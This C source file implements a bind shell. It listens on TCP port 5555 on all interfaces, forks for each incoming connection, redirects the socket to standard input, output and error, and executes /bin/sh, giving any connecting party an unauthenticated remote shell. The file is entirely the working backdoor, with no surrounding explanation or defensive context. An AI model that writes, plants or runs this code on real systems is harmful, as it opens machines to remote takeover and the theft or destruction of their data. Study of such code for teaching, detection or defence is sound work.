#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* bind shell */

#define PORT 5555

int main(int argc, char **argv) {
    int sockfd, newsockfd, pid;
    struct sockaddr_in server_addr;

    // create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(1);
    }
    printf("Socket created.\n");

    // declare members of server socket address
    /*struct sockaddr_in { // internet socket address
        short            sin_family;   // e.g. AF_INET
        unsigned short   sin_port;     // e.g. htons(3490)
        struct in_addr   sin_addr;     // see struct in_addr, below
        char             sin_zero[8];  // zero this if you want to
    };

    struct in_addr { // internet address
        unsigned long s_addr;  // load with inet_aton()
    };*/
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY; // bind to all local interfaces
    server_addr.sin_port = htons(PORT);

    // bind socket to address
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error binding socket to address");
        exit(1);
    }
    printf("Socket bound to internet address.\n");

    // listen for connections
    if (listen(sockfd, 0) < 0) {
        perror("Error on listen");
        exit(1);
    }
    printf("Listening for connections.\n");

    while (1) {
        // accept new connections
        newsockfd = accept(sockfd, NULL, NULL);
        if (newsockfd < 0) {
            perror("Connection failed");
            exit(1);
        }
        printf("Connection established.\n");

        pid = fork();
        if (pid < 0) {
            perror("Error on fork");
            exit(1);
        } else if (pid == 0) {
            close(sockfd);
            bind_shell(newsockfd);
            exit(0);
        } else {
            close(newsockfd);
        }
    }
}

void bind_shell(int sockfd) {
    // duplicate new socket to stdin/out/err
    for (int i=0; i<3; i++) {
        if (dup2(sockfd, i) < 0) {
            perror("Error duplicating connected socket");
            exit(1);
        }
    }
    printf("Socket I/O established.\n");

    // execute a shell
    execve("/bin/sh", NULL, NULL);

    // we should never come back here
    perror("Error during execution");
    exit(1);
}
